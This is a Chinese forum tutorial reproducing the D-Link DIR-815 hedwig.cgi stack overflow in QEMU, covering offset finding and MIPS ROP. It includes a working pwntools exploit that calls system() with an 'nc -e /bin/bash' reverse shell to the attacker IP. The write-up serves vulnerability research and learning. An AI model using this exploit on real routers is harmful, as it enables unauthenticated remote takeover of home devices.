> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-268623.htm)

> [原创] 家用路由器漏洞挖掘实例分析 [图解 D-LINK DIR-815 多次溢出漏洞]

D-LINK DIR-815 多次溢出漏洞
=====================

目录

*   D-LINK DIR-815 多次溢出漏洞
*   [说明](#说明)
*   [所需相关资源](#所需相关资源)
*   [漏洞介绍](#漏洞介绍)
*   [漏洞分析](#漏洞分析)
*            [漏洞定位](#漏洞定位)
*            [IDA 静态调试分析 - 定位漏洞溢出点](#ida静态调试分析-定位漏洞溢出点)
*   [IDA 动态调试 - 确定偏移位置（手动 + 自动两种方法）](#ida动态调试-确定偏移位置（手动+自动两种方法）)
*   [构造 ROP](#构造rop)
*            [gdb-multiarch+QEMU 动态调试分析验证](#gdb-multiarch+qemu动态调试分析验证)
*            cache incoherency 问题（影响 EXP 执行）
*            [坏字符问题](#坏字符问题)
*   [qemu 系统模式](#qemu系统模式)
*   [gdbserver 调试](#gdbserver调试)
*   [编写 exp](#编写exp)
*   [总结](#总结)
*   [参考](#参考)

说明
==

原创作者：herculiz

 

以下内容纯原创辛苦手打，望大家多多支持。

 

首先感谢各位以下相关链接前辈师傅的知识分享精神，才萌生了本文。

 

由于年限及知识的更新，笔者觉得过去许多描述可能对新手不太友好（自己的痛苦经历），所以对其进行了补充及概述。

所需相关资源
======

*   固件下载：ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP
    
*   gdbserver 各架构对应调试文件（已经编译好了可以直接使用）：https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver
    
*   IDA6.8/IDA7.5：一个用在 ubuntu 调试，一个用在 windows 调试（7.5 有更高级的 mips 反汇编器，可以方便参考伪代码）。或者谢安在`Ghidra`工具，专门反汇编反编译 mips 架构程序，目前只用于静态分析。
*   qemu-mips 仿真的相关内核和虚拟硬盘（这里有坑，后面在说，总之一定要两者`内核`和`虚拟硬盘`匹配）：https://people.debian.org/~aurel32/qemu/

漏洞介绍
====

exploitdb 介绍: https://www.exploit-db.com/exploits/33863

 

![](https://bbs.pediy.com/upload/attach/202107/913238_4BRQSE3VYP9Q4SJ.png)

```
Buffer overflow on “hedwig.cgi”
Another buffer overflow affects the “hedwig.cgi” CGI script. Unauthenticated remote attackers can invoke this CGI with an overly-long cookie value that can overflow a program buffer and overwrite the saved program address.

```

从漏洞公告中可以看出，该漏洞存在于名为 **“hedwig.cgi”** 的 CGI 脚本中，未认证攻击者通过调用这个 CGI 脚本传递一个**超长的 Cookie 值**，使得程序**栈溢出**，从而获得路由器的远程控制权限。

漏洞分析
====

漏洞定位
----

1，`binwalk -Me`解压提取固件

 

![](https://bbs.pediy.com/upload/attach/202107/913238_M77F5KG34GD3R7U.png)

 

2，

 

该漏洞的核心组件为 hedwig.cgi，`find . -name '*cgi'`查找文件，并`ls -l ./htdocs/web/hedwig.cgi`发现 hedwig.cgi 是指向./htdocs/cgibin 的符号链接，也就是说真正的漏洞代码在 cgibin 中。  
![](https://bbs.pediy.com/upload/attach/202107/913238_B6G7QSA22WN37QH.png)

IDA 静态调试分析 - 定位漏洞溢出点
--------------------

1，用 IDA 静态调试`cgibin`文件，`hedwigcgi_main`函数处理真个过程，由于是`HTTP_COOK`这个字段引起的漏洞溢出点，可以在 IDA（SHIFT+F12）搜索字符串，然后通过 X，交叉引用来跟踪到`hedwigcgi_main`函数条用的位置。

 

![](https://bbs.pediy.com/upload/attach/202107/913238_YUZ2WMAZKS9D3TZ.png)

 

![](https://bbs.pediy.com/upload/attach/202107/913238_G4CPAXBA9J3X5XH.png)

 

跟踪到主函数的位置，对函数功能进行大致分析，或者利用 Ghidra 或 IDA7.5 反汇编`hedwigcgi_main`函数，可以定位到其中的`sprintf`函数引起了栈溢出（其实在后面还有一个`sprintf`函数调用，它才是真实环境利用的位置，后面讲解说明）。`hedwigcgi_main`函数通过`sess_get_uid()`获取到`HTTP_COOKIE`中`uid=`之后的值，并将该内容按照`sprintf`函数中格式化字符串给定的形式拷贝到栈中，由于没有检测并限制输入的大小，导致栈溢出。

 

![](https://bbs.pediy.com/upload/attach/202107/913238_3JJV9QWV3ZCVSNG.png)

 

[参考 1：函数功能流程说明](https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/)

IDA 动态调试 - 确定偏移位置（手动 + 自动两种方法）
==============================

这里需要用到 qemu+IDA 动态调试的方法：[参考 2：qemu+IDA 动态调试](https://blog.csdn.net/weixin_43194921/article/details/104704048)

 

此处是 qemu 用户模式下仿真程序启动，qemu 有两种模式，`用户模式`和`系统模式`, 详细工具使用这在不影响思路的情况下为了避免篇幅冗余过长就省略了。

 

![](https://bbs.pediy.com/upload/attach/202107/913238_2N663U5Q9SYY3XA.png)

 

文件时小端有效的 mips 指令集，我们使用`qemu-mipsel`

 

`注意：` `qemu-mipsel` 由于依赖各种动态库，避免出现各种问题，我们这里手动复制库到当前目录下（`squashfs-root`目录下）

 

1，查看`qemu-mipsel`依赖的 libc

 

![](https://bbs.pediy.com/upload/attach/202107/913238_K439JQ6ZK3UH6EF.png)

 

2，直接创建后面的目录名，并复制动态链接库

```
mkdir -p ./usr/lib/
mkdir -p ./lib/x86_64-linux-gnu/
mkdir -p ./lib64/
cp -p /usr/lib/x86_64-linux-gnu/libgmodule-2.0.so.0  ./usr/lib/
cp -p /lib/x86_64-linux-gnu/libglib-2.0.so.0  ./lib/x86_64-linux-gnu/
cp -p /lib/x86_64-linux-gnu/librt.so.1  ./lib/x86_64-linux-gnu/
cp -p /lib/x86_64-linux-gnu/libm.so.6  ./lib/x86_64-linux-gnu/
cp -p /lib/x86_64-linux-gnu/libgcc_s.so.1  ./lib/x86_64-linux-gnu/
cp -p /lib/x86_64-linux-gnu/libpthread.so.0  ./lib/x86_64-linux-gnu/
cp -p /lib/x86_64-linux-gnu/libc.so.6  ./lib/x86_64-linux-gnu/
cp -p /lib/x86_64-linux-gnu/libdl.so.2  ./lib/x86_64-linux-gnu/
cp -p /lib/x86_64-linux-gnu/libpcre.so.3  ./lib/x86_64-linux-gnu/
cp -p /lib64/ld-linux-x86-64.so.2  ./lib64/

```

3，通过脚本调试

 

当然也能直接通过以下参数方式调试，但个人感觉用习惯了脚本方式能更方便的修改参数内容和视觉上的简约。

 

`sudo chroot ./ ./qemu-mipsel -E CONTENT_LENGTH=20 -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=`python -c "print'uid=123'+'A'*0x600"`-E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="192.168.x.x" -g 1234 ./htdocs/web/hedwig.cgi`

 

3.1 自己编写的调试 tesh.sh 脚本

```
#!/bin/bash
#注意：里面=和变量之间一定不要有空格，坑，否则读入空数据。
#test=$(python -c "print 'uid='+open('content','r').read(2000)") #方式一，以文件形式读入内容，提前填充好构造的数据到content文件
#test=$(python -c "print 'uid=' + 'A'*0x600" )#方式二，直接后面接数据内容
test=$(python -c "print 'uid='+open('exploit','r').read()")
#test =$(python -c "print 'uid=' + 'A'*1043 + 'B'*4")#可选构造数据
 
LEN=$(echo -n "$test" | wc -c)    #如果有看《揭秘家用路由器0day漏洞挖掘技术》书的同学，书上这里应该是填错了
PORT="1234"
cp $(which qemu-mipsel) ./qemu
sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null    #-E参数：加入环境变量 ；2>/dev/null ：不输出提示错误
rm -f ./qemu

```

3.2 利用 patternLocOffset.py 生成 content 文件，包含特定格式的 2000 个字符串。

```
python patternLocOffset.py -c -l 2000 -f content

```

patternLocOffset.py 源码附上（当然像 cyclic 这种工具也一样能实现同样效果）：

```
# coding:utf-8
'''
生成定位字符串：轮子直接使用
'''
 
import argparse
import struct
import binascii
import string
import sys
import re
import time
a ="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
b ="abcdefghijklmnopqrstuvwxyz"
c = "0123456789"
def generate(count,output):
    # pattern create
    codeStr =''
    print '[*] Create pattern string contains %d characters'%count
    timeStart = time.time()
    for i in range(0,count):
        codeStr += a[i/(26*10)] + b[(i%(26*10))/10] + c[i%(26*10)%10]
    print 'ok!'
    if output:
        print '[+] output to %s'%output
        fw = open(output,'w')
        fw.write(codeStr)
        fw.close()
        print 'ok!'
    else:
        return codeStr
    print "[+] take time: %.4f s"%(time.time()-timeStart)
 
def patternMatch(searchCode, length=1024):
 
   # pattern search
   offset = 0
   pattern = None
 
   timeStart = time.time()
   is0xHex = re.match('^0x[0-9a-fA-F]{8}',searchCode)
   isHex = re.match('^[0-9a-fA-F]{8}',searchCode)
 
   if is0xHex:
       #0x41613141
       pattern = binascii.a2b_hex(searchCode[2:])
   elif isHex:
       pattern = binascii.a2b_hex(searchCode)
   else:
       print  '[-] seach Pattern eg:0x41613141'
       sys.exit(1)
 
   source = generate(length,None)
   offset = source.find(pattern)
 
   if offset != -1: # MBS
       print "[*] Exact match at offset %d" % offset
   else:
       print
       "[*] No exact matches, looking for likely candidates..."
       reverse = list(pattern)
       reverse.reverse()
       pattern = "".join(reverse)
       offset = source.find(pattern)
 
       if offset != -1:
           print "[+] Possible match at offset %d (adjusted another-endian)" % offset
 
   print "[+] take time: %.4f s" % (time.time() - timeStart)
 
def mian():
   '''
   parse argument
   '''
   parser = argparse.ArgumentParser()
   parser.add_argument('-s', '--search', help='search for pattern')
   parser.add_argument('-c', '--create', help='create a pattern',action='store_true')
   parser.add_argument('-f','--file',help='output file name',default='patternShell.txt')
   parser.add_argument('-l', '--length', help='length of pattern code',type=int, default=1024)
   args = parser.parse_args()
   '''
   save all argument
   '''
   length= args.length
   output = args.file
   createCode = args.create
   searchCode = args.search
 
   if createCode and (0 
```

3.3 根据构造内容分析`栈buff起始位置`和`$ra位置`

 

![](https://bbs.pediy.com/upload/attach/202107/913238_C7NSM8M5YGSFHFS.png)

 

可以在附近多下几个断点，然后观察栈内容数据。

 

`坑点1：`观察数据时候一定要对指定内容同步上，不然可能调着调着数据你都找不到。

 

`坑点2：` 你看数据内存中的内容的时候可能出现一段问号，基本就能判定处问号的起始和终止就是我们要找的位置，注释 IDA 对内存读写的保护机制，IDA 会提示的，注意仔细看。（我没遇到，参考其他文章时看到介绍了，所以这里也提示下大家，可以通过手动去恢复显示，这里找不到链接了）

 

![](https://bbs.pediy.com/upload/attach/202107/913238_7EMSF9ZE64M3GWC.png)

 

我构造的内容是从 123 开始，去找对应位置，即 buff 起始，并去找到栈上 123 对应起始位置，栈上的地址才是我们需要的，因为最终算的偏移是栈上的 $RA 位置 减去 缓存起始位置。

 

![](https://bbs.pediy.com/upload/attach/202107/913238_D5SH4GUQPCS5UAX.png)  
又添加了一张下图，为了让大家更好看清栈中内容，是我后面调试匹配的（内容我更换了，思路一样的）

 

![](https://bbs.pediy.com/upload/attach/202107/913238_SGXFDYU2CT95UXX.png)

 

找储存 $RA 位置

 

![](https://bbs.pediy.com/upload/attach/202107/913238_MQ4T8HAURFWU46P.png)

 

自动确定偏移：

```
python patternLocOffset.py -s 0x38694237 -l 2000

```

手动：保存 $RA 栈的地址 - 读入 buff 起始的位置

 

`坑点3：`由于之前 file 缺点了大小端，所以如果之前没分析，找偏移时候还需两种模式计算偏移，然后核对。

 

经过验证，真正的漏洞点是第二个 sprintf 函数，找偏移类似以上过程。

 

`原因：`由于不是在真实环境下，里面缺少了相关文件，即偏移位置不同导致流程没在精心构造的步骤执行导致第一处 sprintf 利用 rop 失败。

构造 ROP
======

无论是第一个 sprintf 还是第二个 sprintf 函数发生溢出，分析的流程是一样的，`定位漏洞位置`和`确定偏移值`。

 

所以我们可以先来构造 ROP。主要的攻击目的是通过调用 system(‘/bin/sh’) 来 getshell，system 函数在 libc.so 中找，参数’/bin/sh’首先放入栈中，然后利用 gadget 将栈上的’/bin/sh’传入 a0 寄存器，再调用 system 函数即可。

 

下面我们通过 gdb-multiarch+QEMU 动态调试分析。

gdb-multiarch+QEMU 动态调试分析验证
---------------------------

1，通过 gdb 指定脚本调试（避免重复输入，重复造轮子浪费时间）

 

`dbgscript脚本内容：`

```
gdb-multiarch htdocs/cgibin #一定要加载文件htdocs/cgibin不然vmmap得不到结果
set architecture mips
target remote :1234
b *0x409A54 #hedwigcgi_main()函数返回jr ra处，先前IDA静态分析可获得此地址
c
vmmap

```

启动执行命令：

 

`gdb-multiarch htdocs/cgibin -x dbgscript`

 

-x 是指定要执行的命令文件

 

后面找 gadget 利用插件`mipsrop`请参考：[如何寻找 gadget 及分析](https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/)

 

这里补充点：第一次 gadget

 

![](https://bbs.pediy.com/upload/attach/202107/913238_VH3PWSZUTS762TE.png)

 

所以下面是 a0=$(sp+0x170-0x160)

 

![](https://bbs.pediy.com/upload/attach/202107/913238_WHGKYGTS8ZGAMCB.png)

 

关于 ROP：

 

![](https://bbs.pediy.com/upload/attach/202107/913238_ADR87M9WEJSWMXY.png)

cache incoherency 问题（影响 EXP 执行）
-------------------------------

mips 的 exp 编写中还有一个问题就是 cache incoherency。MIPS CPUs 有两个独立的 cache：指令 cache 和数据 cache。指令和数据分别在两个不同的缓存中。当缓存满了，会触发 flush，将数据写回到主内存。攻击者的攻击 payload 通常会被应用当做数据来处理，存储在数据缓存中。当 payload 触发漏洞，劫持程序执行流程的时候，会去执行内存中的 shellcode。如果数据缓存没有触发 flush 的话，shellcode 依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储 shellcode 的地址处随机的代码，导致不可预知的后果。

 

最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如 sleep(1) 或者其他类似的函数。sleep 的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行 flush。

 

参考：[cache incoherency](http://xdxd.love/2016/12/09/%E4%B8%80%E4%B8%AAmips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8/)

坏字符问题
-----

构造 exp 时有可能的坏字符：0x20（空格）、0x00（结束符）、0x3a（冒号）、0x3f（问号）、0x3b（分号）、0x0a(\n 换行符) 等。具体还要看程序如何处理以及转义。

 

由于 qemu 用户模式下仿真执行程序，环境各种因素影响导致执行 shell 失败，下面我们使用`qemu系统模式`仿真路由器真实环境进行溢出。

qemu 系统模式
=========

这里主要是为了在 qemu 虚拟机中重现 http 服务。通过查看文件系统中的`/bin、/sbin、/usr/bin、/usr/sbin`可以知道`/sbin/httpd`应该是用于监听 web 端口的 http 服务，同时查看`/htdocs/web`文件夹下的 cgi 文件和 php 文件，可以了解到接受到的数据通过 php+cgi 来处理并返回客户端。

 

1，自己按配置所需写入新建 conf 文件内容。

 

`find ./ -name '*http*'`找到 web 配置文件 httpcfg.php。

 

![](https://bbs.pediy.com/upload/attach/202107/913238_V8XM6ZY7WMGMR45.png)

 

查看内容后分析出`httpcfg.php`文件的作用是生成供所需服务的`配置文件`的内容，所以我们参照里面内容，自己创建一个 conf 作为生成的`配置文件`，填充我们所需的内容。

 

`conf文件内容：`

```
Umask 026
PIDFile /var/run/httpd.pid
LogGMT On  #开启log
ErrorLog /log #log文件
 
Tuning
{
    NumConnections 15
    BufSize 12288
    InputBufSize 4096
    ScriptBufSize 4096
    NumHeaders 100
    Timeout 60
    ScriptTimeout 60
}
 
Control
{
    Types
    {
        text/html    { html htm }
        text/xml    { xml }
        text/plain    { txt }
        image/gif    { gif }
        image/jpeg    { jpg }
        text/css    { css }
        application/octet-stream { * }
    }
    Specials
    {
        Dump        { /dump }
        CGI            { cgi }
        Imagemap    { map }
        Redirect    { url }
    }
    External
    {
        /usr/sbin/phpcgi { php }
    }
}
 
 
Server
{
    ServerName "Linux, HTTP/1.1, "
    ServerId "1234"
    Family inet
    Interface eth0 #对应qemu仿真路由器系统的网卡
    Address 192.168.x.x #qemu仿真路由器系统的IP
    Port "1234" #对应未被使用的端口
    Virtual
    {
        AnyHost
        Control
        {
            Alias /
            Location /htdocs/web
            IndexNames { index.php }
            External
            {
                /usr/sbin/phpcgi { router_info.xml }
                /usr/sbin/phpcgi { post_login.xml }
            }
        }
        Control
        {
            Alias /HNAP1
            Location /htdocs/HNAP1
            External
            {
                /usr/sbin/hnap { hnap }
            }
            IndexNames { index.hnap }
        }
    }
}

```

启动 qemu 仿真路由器系统：

```
sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic

```

`坑点4：`https://people.debian.org/~aurel32/qemu/ 此处下载的 `-kernel`和 `-hda`的文件一定要同一个目录下的，并且匹配上的程序的`大小端序`，否则执行会出现![image-20210722182658332] ![](https://bbs.pediy.com/upload/attach/202107/913238_K8J5HNY3CNBTBSV.png)

 

此内容提示。

 

2，测试两台主机 ping 通网络情况

 

qemu 网络配置参考：[家用路由器研究详解入门（内含仿真环境搭建）](https://blog.csdn.net/weixin_44309300/article/details/118526235) 两台主机互通按里面内容配置即可，如想联通外网，可按一把梭方法（硬核联网）。

 

3，将固件的提取的文件系统 (在 Ubuntu 上) 利用 scp 命令拷贝到 mipsel 虚拟机中

```
sudo scp -r squashfs-root root@192.168.x.x:/root/

```

[scp 命令使用参考](https://www.runoob.com/linux/linux-comm-scp.html)

 

4，之后编写 copy.sh 脚本配置启动 http 服务需要的环境包括动态链接库，以及 conf 配置文件中提到的`/usr/sbin/phpcgi`，`/usr/sbin/hnap`。

```
cp conf /
cp sbin/httpd /
cp -rf htdocs/ /
rm /etc/services
cp -rf etc/ /
cp lib/ld-uClibc-0.9.30.1.so  /lib/
cp lib/libcrypt-0.9.30.1.so  /lib/
cp lib/libc.so.0  /lib/
cp lib/libgcc_s.so.1  /lib/
cp lib/ld-uClibc.so.0  /lib/
cp lib/libcrypt.so.0  /lib/
cp lib/libgcc_s.so  /lib/
cp lib/libuClibc-0.9.30.1.so  /lib/
cd /
ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi
ln -s /htdocs/cgibin /usr/sbin/phpcgi
ln -s  /htdocs/cgibin /usr/sbin/hnap
./httpd -f conf

```

记得启动执行（需要进入 squashfs-root 目录使用，脚本最后启动了 http 服务。）：

 

`./copy.sh`

 

5, 在浏览器中访问 conf 文件中配置的`192.168.79.143:1234/hedwig.cgi` 文件内容

 

5.1 访问方式一：

 

`坑点5：`如果你直接在浏览器中输入以上地址，默认 https 访问，手动改成 http 协议即可看见服务被启动。

 

![](https://bbs.pediy.com/upload/attach/202107/913238_4EXVRGSF38G7XR5.png)

 

![](https://bbs.pediy.com/upload/attach/202107/913238_3E9K3X69ER572ZP.png) ![](https://bbs.pediy.com/upload/attach/202107/913238_YFT56VKC7G3V9SZ.png)

 

5.2 访问方式二：

 

在宿主机 (ubuntu) 中使用以下命令：其中 - v 显示详细信息，-X 指定什么指令，-H 自定义头信息传递给服务器，-b 指定 cookie 字符串。

```
curl http://192.168.79.143:1234/hedwig.cgi -v -X POST -H "Content-Length: 8" -b  "uid=zh"

```

[curl 使用：](https://www.cnblogs.com/duhuo/p/5695256.html)在 Linux 中 curl 是一个利用 URL 规则在命令行下工作的文件传输工具，可以说是一款很强大的 http 命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称 url 为下载工具。

 

![](https://bbs.pediy.com/upload/attach/202107/913238_4HY23D2DCS5F3QR.png)

gdbserver 调试
============

1，接下来尝试调试`/htdocs/web/hedwig.cgi`文件

 

![](https://bbs.pediy.com/upload/attach/202107/913238_3QFQZ2DTXKZ8F3B.png)

 

返回 no REQUEST，查看 IDA 静态反汇编得知没有指定环境变量`REQUEST_METHOD`的值（还是怼时间去逆向分析函数功能，如果能通过浏览器找到相关函数功能说明最好了，节约时间）。所以想要触发漏洞进行调试的话，还是需要通过 export 设置相关环境变量。

```
export CONTENT_LENGTH="100"export CONTENT_TYPE="application/x-www-form-urlencoded"export REQUEST_METHOD="POST"export REQUEST_URI="/hedwig.cgi"export HTTP_COOKIE="uid=1234"

```

运行成功：

 

![](https://bbs.pediy.com/upload/attach/202107/913238_RZKK4ESNDP4J2JR.png)

 

2，接下来动态调试确定偏移但是在那之前需要关掉地址随机化，因为 qemu 的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致 libc 的基地址也不断在变，所以需要关闭地址随机化。

```
echo 0 > /proc/sys/kernel/randomize_va_space

```

3，在 qemu 仿真路由器系统中，和 gdb 进行动态调试

 

目的：验证地址偏移位置。

 

`qemu仿真路由器系统中`编写调试脚本：

```
#!/bin/bashexport CONTENT_LENGTH="100"export CONTENT_TYPE="application/x-www-form-urlencoded"export HTTP_COOKIE="`cat content`"    #content你自己构造的数据内容，原本是没有的按上面所述的方式去创建export REQUEST_METHOD="POST"export REQUEST_URI="/hedwig.cgi"echo "uid=1234"|./gdbserver.mipsel 192.168.x.x:9999 /htdocs/web/hedwig.cgi

```

记得在仿真路由器系统中启动：

 

`./debug.sh`

 

接下来启动 gdb 调试便可确定偏移。（这里 gdb 调试技能各位同学自己去实践操作吧，本人也在不断熟悉过程中，就不带各位一步一步跟了）

 

4，接下来是确定 libc 的基地址，需要先把环境变量配置好，不然 / htdocs/web/hedwig.cgi 很快就执行完，进程立马就结束了，就得不到 maps。

 

利用（注意根据会先 pid 规律，快速修改预测 pid 执行，否则 maps 地址数据不会出来）

```
/htdocs/web/hedwig.cgi & cat /proc/pid/maps

```

**a&b 先执行 a，在执行 b，无论 a 成功与否都会执行 b**。因为关闭了地址随机化，libc.so.0 的基地址就是 0x77f34000。这里的 libc.so.0 是指向 libuClibc-0.9.30.1.so。所以 libuClibc-0.9.30.1.so 基地址为 0x77f34000。

```
root@debian-mipsel:~/squashfs-root# export CONTENT_LENGTH="100"root@debian-mipsel:~/squashfs-root# export CONTENT_TYPE="application/x-www-form-urlencoded"root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps[10] 1052cat: /proc/pid/maps: No such file or directoryroot@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps[11] 1054cat: /proc/pid/maps: No such file or directory[10]+  Stopped                 /htdocs/web/hedwig.cgiroot@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/1056/maps [12] 105600400000-0041c000 r-xp 00000000 08:01 32694      /htdocs/cgibin0042c000-0042d000 rw-p 0001c000 08:01 32694      /htdocs/cgibin0042d000-0042f000 rwxp 00000000 00:00 0          [heap]77f34000-77f92000 r-xp 00000000 08:01 547906     /lib/libc.so.077f92000-77fa1000 ---p 00000000 00:00 0 77fa1000-77fa2000 r--p 0005d000 08:01 547906     /lib/libc.so.077fa2000-77fa3000 rw-p 0005e000 08:01 547906     /lib/libc.so.077fa3000-77fa8000 rw-p 00000000 00:00 0 77fa8000-77fd1000 r-xp 00000000 08:01 546761     /lib/libgcc_s.so.177fd1000-77fe1000 ---p 00000000 00:00 0 77fe1000-77fe2000 rw-p 00029000 08:01 546761     /lib/libgcc_s.so.177fe2000-77fe7000 r-xp 00000000 08:01 547907     /lib/ld-uClibc.so.077ff5000-77ff6000 rw-p 00000000 00:00 0 77ff6000-77ff7000 r--p 00004000 08:01 547907     /lib/ld-uClibc.so.077ff7000-77ff8000 rw-p 00005000 08:01 547907     /lib/ld-uClibc.so.07ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]7fff7000-7fff8000 r-xp 00000000 00:00 0          [vdso][11]+  Stopped                 /htdocs/web/hedwig.cgi

```

编写 exp
======

system 方法：将上面的 exp 的 libc 基地址和偏移改掉然后 cmd 换成`nc -e /bin/bash 192.168.x.145 9999`（IP 地址是 ubuntu 机器的，即攻击主机 IP）

```
#!/usr/bin/python2from pwn import *context.endian = "little"context.arch = "mips"base_addr = 0x77f34000system_addr_1 = 0x53200-1gadget1 = 0x45988gadget2 = 0x159cccmd = 'nc -e /bin/bash 192.168.79.145 9999'padding = 'A' * 973 #1009-4*9padding += p32(base_addr + system_addr_1) # s0padding += p32(base_addr + gadget2)       # s1padding += 'A' * 4                        # s2padding += 'A' * 4                        # s3padding += 'A' * 4                        # s4padding += 'A' * 4                           # s5padding += 'A' * 4                        # s6padding += 'A' * 4                        # s7padding += 'A' * 4                        # fppadding += p32(base_addr + gadget1)       # rapadding += 'B' * 0x10padding += cmdf = open("context",'wb')f.write(padding)f.close()

```

生成的 context 通过 scp 拷贝到 mips 虚拟机中并且`nano debug.sh`更改 debug.sh

 

`新的debug.sh内容：（在路由器仿真系统执行，即被攻击机）`

```
#!/bin/bashexport CONTENT_LENGTH="100"export CONTENT_TYPE="application/x-www-form-urlencoded"export HTTP_COOKIE="uid=`cat context`"export REQUEST_METHOD="POST"export REQUEST_URI="/hedwig.cgi"echo "uid=1234"|/htdocs/web/hedwig.cgi#echo "uid=1234"|./gdbserver.mipsel 192.168.x.145:9999 /htdocs/web/hedwig.cgi

```

在 mips 虚拟机运行之后在本机 nc -vlp 9999，确实能够获取 / bin/bash 权限。成功了！说明 rop 链构造是没问题的。

 

![](https://bbs.pediy.com/upload/attach/202107/913238_UA863HFKQDAN5ZY.png)

 

`最后：`exp 当然不止这一种，其他可以利用的方法也许多，由于受限于个人的知识水平，整理难免会出现不正确的地方，如若发现了问题，欢迎指出，笔者也会修改和完善相关内容，继续努力贡献更优质的号文章分享给大家。

总结
==

由于各种原因涉及此行业，也是个人第一个完整复现成功的漏洞，在学习过程中发现许多问题，并且从解决过程中收获许多，正是因为遇到许多奇怪的坑，并且能找的相关资料甚少，所以花了大量时间完成了本文，文中内容尽量做到细节步骤都配图说明，希望能帮助到更多的同学。

 

`浅聊心态历程：`遇到各种问题被卡住时难免会产生放弃及怀疑的思虑，坚持下来的原因对我而言更多的是热爱，如若不是兴趣趋势，小劝各位同学尽早发现自己喜欢的方向或者职业。

参考
==

1，DIR815 缓冲区溢出漏洞分析相关：

 

[https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/](https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/)[1]

 

[http://www.giantbranch.cn/2018/05/03/D-Link_DIR-815_%E8%B7%AF%E7%94%B1%E5%99%A8%E5%A4%9A%E6%AC%A1%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/](http://www.giantbranch.cn/2018/05/03/D-Link_DIR-815_%E8%B7%AF%E7%94%B1%E5%99%A8%E5%A4%9A%E6%AC%A1%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/)[2]

 

https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/#0x02-IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90[3]

 

2，环境搭建

 

[https://blog.csdn.net/weixin_44309300/article/details/118526235](https://blog.csdn.net/weixin_44309300/article/details/118526235)[1]

 

[https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/](https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/)[2]

 

3，GDB+GDBServer 调试 Linux 应用程序

 

[https://www.cnblogs.com/cslunatic/p/3635520.html](https://www.cnblogs.com/cslunatic/p/3635520.html)

 

4，配置文件

 

[httpd 配置文件 httpd.conf 规则说明和一些基本指令](https://www.cnblogs.com/f-ck-need-u/p/7636836.html)

 

5，<<揭秘家用路由器 0day 漏洞挖掘技术>>

[[注意] 招人！base 上海，课程运营、市场多个坑位等你投递！](https://bbs.pediy.com/thread-267474.htm)

[#漏洞分析](forum-128-1-171.htm) [#家用设备](forum-128-1-173.htm)